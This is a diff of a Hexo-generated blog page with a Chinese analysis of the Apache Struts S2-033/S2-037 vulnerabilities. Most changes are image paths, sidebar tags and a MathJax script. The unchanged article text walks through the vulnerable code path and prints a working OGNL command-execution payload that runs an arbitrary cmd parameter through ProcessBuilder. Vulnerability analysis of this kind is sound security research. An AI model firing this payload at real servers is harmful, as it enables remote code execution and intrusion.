@@ -26,19 +26,19 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="S2-033 影响版本 Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外） S2-037 影响版本 Struts 2.3.20 - Struts Struts 2.3.28.1  2.3.20.3 &amp; 2.3.24.3 &amp; 2.3.28.1 为s2-033修复版本  吐槽：33跟32其实关系不大，只是payload大致">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
 <meta property="article:published_time" content="2018-10-31T06:15:55.000Z">
 <meta property="article:modified_time" content="2020-08-01T13:16:36.048Z">
 <meta property="article:author" content="Sariel.D">
 <meta property="article:tag" content="java">
 <meta property="article:tag" content="struts">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -508,7 +508,7 @@
   )
 </script>
 
-            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
@@ -535,11 +535,11 @@
 </li>
 </ol>
 <h3 id="跟进分析"><a href="#跟进分析" class="headerlink" title="跟进分析"></a>跟进分析</h3><h4 id="DynamicMethodInvocation-True"><a href="#DynamicMethodInvocation-True" class="headerlink" title="DynamicMethodInvocation == True"></a>DynamicMethodInvocation == True</h4><ol>
-<li><p>重点在PrepareOperations.findActionMapping，调用RestActionMapper.getMapping<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15410565251003.jpg" alt></p>
+<li><p>重点在PrepareOperations.findActionMapping，调用RestActionMapper.getMapping<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15410565251003.jpg" alt></p>
 </li>
 <li><p>第一个断点处，获取合法后缀，而this.extensions定义来源于rest包下的struts-plugin.xml</p>
 <pre class=" language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constant</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts.action.extension<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>xhtml,,xml,json<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15410568676247.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15410568676247.jpg" alt></p>
 </li>
 <li><p>然后进去第二个断点处，首先判断是否有<code>!</code>，如果有<code>!</code>且<code>动态方法调用开启</code>，则将<code>!</code>后的字符串填充<code>method</code></p>
 <pre class=" language-java"><code class="language-java"> <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">handleDynamicMethodInvocation</span><span class="token punctuation">(</span>ActionMapping mapping<span class="token punctuation">,</span> String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -555,7 +555,7 @@
 
  <span class="token punctuation">}</span></code></pre>
 </li>
-<li><p>接着RestActionInvocation顺序执行所有拦截器，(RestActionInvocation继承DefaultActionInvocation)，遍历之后通过DefaultActionInvocation.invokeActionOnly实现Action调用<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15410591488893.jpg" alt></p>
+<li><p>接着RestActionInvocation顺序执行所有拦截器，(RestActionInvocation继承DefaultActionInvocation)，遍历之后通过DefaultActionInvocation.invokeActionOnly实现Action调用<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15410591488893.jpg" alt></p>
 <pre class=" language-java"><code class="language-java">
  <span class="token keyword">public</span> String <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
      String profileKey <span class="token operator">=</span> <span class="token string">"invoke: "</span><span class="token punctuation">;</span>
@@ -575,11 +575,11 @@
 
          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
 </li>
-<li><p>然后这里（竟然）直接用ognl执行<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15410595266502.jpg" alt></p>
+<li><p>然后这里（竟然）直接用ognl执行<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15410595266502.jpg" alt></p>
 </li>
 </ol>
 <h4 id="DynamicMethodInvocation-False"><a href="#DynamicMethodInvocation-False" class="headerlink" title="DynamicMethodInvocation == False"></a>DynamicMethodInvocation == False</h4><ol>
-<li>如果为False则在第二个断点处不会添加method，但是在第三个断点处会重复两次对<code>/</code>进行判断，然后将最后的字符串作为method（这里要注意<code>//</code>中间必须有数据，不然会被解析成<code>/</code>无法添加为method）<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15410659981835.jpg" alt></li>
+<li>如果为False则在第二个断点处不会添加method，但是在第三个断点处会重复两次对<code>/</code>进行判断，然后将最后的字符串作为method（这里要注意<code>//</code>中间必须有数据，不然会被解析成<code>/</code>无法添加为method）<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15410659981835.jpg" alt></li>
 </ol>
 <h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>【占坑】没啥好梳理的</p>
 <h2 id="0x03-利用条件"><a href="#0x03-利用条件" class="headerlink" title="0x03 利用条件"></a>0x03 利用条件</h2><p>分为 DynamicMethodInvocation 是否为true</p>
@@ -588,7 +588,7 @@
 <pre><code> !%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23cmd%3D%23parameters.cmd%2C%23a%3Dnew%20java.lang.ProcessBuilder%28%23cmd%29.start%28%29.getInputStream%28%29%2Cnew%20java.lang.String.xhtml?cmd=/Applications/Calculator.app/Contents/MacOS/Calculator</code></pre></li>
 <li><p>False</p>
 <p> 一样的payload，去掉<code>!</code>并保证<code>../../..</code>路由有效性即可</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/617314e9/15583209297942.jpg" alt></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/617314e9/15583209297942.jpg" alt></p>
 </li>
 </ol>
 <h3 id="2-巧妙的绕过OGNL"><a href="#2-巧妙的绕过OGNL" class="headerlink" title="2. 巧妙的绕过OGNL"></a>2. 巧妙的绕过OGNL</h3><p>以上POC有限制，在最新的2.38.1和2.3.20.1等版本中，无法让OGNL执行多条语句。</p>
@@ -1923,6 +1923,12 @@
         
         
         
+        
+        
+        
+        
+        
+        
     
     
     
@@ -2438,6 +2444,16 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
         
+            <span class="sidebar-tag-name" data-tags="Mysql">
+                <span class="iconfont-archer">&#xe606;</span>
+                Mysql
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="ctf">
                 <span class="iconfont-archer">&#xe606;</span>
                 ctf
@@ -2453,11 +2469,6 @@
                 随笔
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Mysql">
-                <span class="iconfont-archer">&#xe606;</span>
-                Mysql
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="内网">
                 <span class="iconfont-archer">&#xe606;</span>
                 内网
@@ -2466,6 +2477,16 @@
             <span class="sidebar-tag-name" data-tags="RedTeam">
                 <span class="iconfont-archer">&#xe606;</span>
                 RedTeam
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="PHP">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP
             </span>
         
             <span class="sidebar-tag-name" data-tags="Burp suite">
@@ -2483,14 +2504,14 @@
                 extension
             </span>
         
-            <span class="sidebar-tag-name" data-tags="代码审计">
+            <span class="sidebar-tag-name" data-tags="Weblogic">
                 <span class="iconfont-archer">&#xe606;</span>
-                代码审计
+                Weblogic
             </span>
         
-            <span class="sidebar-tag-name" data-tags="PHP">
+            <span class="sidebar-tag-name" data-tags="Deserialize">
                 <span class="iconfont-archer">&#xe606;</span>
-                PHP
+                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Tomcat">
@@ -2501,21 +2522,6 @@
             <span class="sidebar-tag-name" data-tags="LFI">
                 <span class="iconfont-archer">&#xe606;</span>
                 LFI
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="RCE">
-                <span class="iconfont-archer">&#xe606;</span>
-                RCE
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Weblogic">
-                <span class="iconfont-archer">&#xe606;</span>
-                Weblogic
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Deserialize">
-                <span class="iconfont-archer">&#xe606;</span>
-                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Chrome">
@@ -2531,6 +2537,11 @@
             <span class="sidebar-tag-name" data-tags="Discuz">
                 <span class="iconfont-archer">&#xe606;</span>
                 Discuz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CodeQL">
+                <span class="iconfont-archer">&#xe606;</span>
+                CodeQL
             </span>
         
             <span class="sidebar-tag-name" data-tags="F5">
@@ -2573,14 +2584,14 @@
                 SQLi
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Redis">
-                <span class="iconfont-archer">&#xe606;</span>
-                Redis
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="struts">
                 <span class="iconfont-archer">&#xe606;</span>
                 struts
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                Redis
             </span>
         
             <span class="sidebar-tag-name" data-tags="SSRF">
@@ -2593,24 +2604,19 @@
                 ThinkPHP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="xss">
-                <span class="iconfont-archer">&#xe606;</span>
-                xss
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="XXE">
                 <span class="iconfont-archer">&#xe606;</span>
                 XXE
             </span>
         
+            <span class="sidebar-tag-name" data-tags="xss">
+                <span class="iconfont-archer">&#xe606;</span>
+                xss
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="OpenCV">
                 <span class="iconfont-archer">&#xe606;</span>
                 OpenCV
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="智能合约">
-                <span class="iconfont-archer">&#xe606;</span>
-                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="spider">
@@ -2623,14 +2629,24 @@
                 smali
             </span>
         
-            <span class="sidebar-tag-name" data-tags="hw2020">
+            <span class="sidebar-tag-name" data-tags="智能合约">
                 <span class="iconfont-archer">&#xe606;</span>
-                hw2020
+                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="深信服">
                 <span class="iconfont-archer">&#xe606;</span>
                 深信服
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Nday">
+                <span class="iconfont-archer">&#xe606;</span>
+                Nday
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="hw2020">
+                <span class="iconfont-archer">&#xe606;</span>
+                hw2020
             </span>
         
             <span class="sidebar-tag-name" data-tags="CAPTCHA">
@@ -2641,16 +2657,6 @@
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Nday">
-                <span class="iconfont-archer">&#xe606;</span>
-                Nday
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="CodeQL">
-                <span class="iconfont-archer">&#xe606;</span>
-                CodeQL
             </span>
         
     </div>
@@ -2664,14 +2670,14 @@
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="编程">
-            <span class="iconfont-archer">&#xe60a;</span>
-            编程
-        </span>
-    
         <span class="sidebar-category-name" data-categories="代码审计">
             <span class="iconfont-archer">&#xe60a;</span>
             代码审计
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="编程">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编程
         </span>
     
         <span class="sidebar-category-name" data-categories="Pentest">
@@ -2742,7 +2748,22 @@
         
         <!-- mermaid -->
         
-    <script>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
             window.imageLazyLoadSetting = {
                 isSPA: false,
                 processImages: null,
